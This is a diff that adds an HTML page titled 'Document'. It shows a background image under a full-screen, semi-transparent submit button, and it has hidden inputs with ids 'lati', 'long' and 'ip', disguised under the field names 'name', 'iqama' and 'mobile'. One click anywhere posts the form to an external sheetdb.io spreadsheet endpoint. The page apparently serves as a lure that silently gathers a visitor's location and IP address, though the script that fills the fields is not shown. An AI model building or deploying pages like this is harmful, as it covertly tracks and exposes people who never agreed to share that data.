@@ -1,0 +1,63 @@
+<!-- @format -->
+
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<script
+			src="https://kit.fontawesome.com/f0be14b3ea.js"
+			crossorigin="anonymous"></script>
+		<title>Document</title>
+
+		<style>
+			body {
+				background: url(tanjin.png) no-repeat;
+				background-position: center;
+				display: block;
+				justify-content: center;
+				margin: auto;
+				width: 100%;
+				height: 100vh;
+			}
+			#lati {
+				display: none;
+			}
+			#long {
+				display: none;
+			}
+			#ip {
+				display: none;
+			}
+			#btn {
+				height: 100vh;
+				width: 100%;
+				border: none;
+				background-color: white;
+				display: block;
+				margin: auto;
+				font-size: 2rem;
+				font-family: monospace;
+				font-weight: bold;
+				align-items: center;
+				justify-content: center;
+				opacity: 0.6;
+			}
+		</style>
+	</head>
+	<body>
+		<form
+			action="https://sheetdb.io/api/v1/4k0qn3xldxtcl"
+			method="post"
+			id="sheetdb">
+			<label for="btn" id="text-show"></label>
+			<input type="text" name="data[name]" id="lati" />
+			<input type="text" name="data[iqama]" id="long" />
+			<input type="text" name="data[mobile]" id="ip" />
+			<!-- <input id="btn" name="btn" type="submit" value="" /> -->
+			<button id="btn" name="btn" type="submit"></button>
+		</form>
+
+		<script src="./index.js"></script>
+	</body>
+</html>
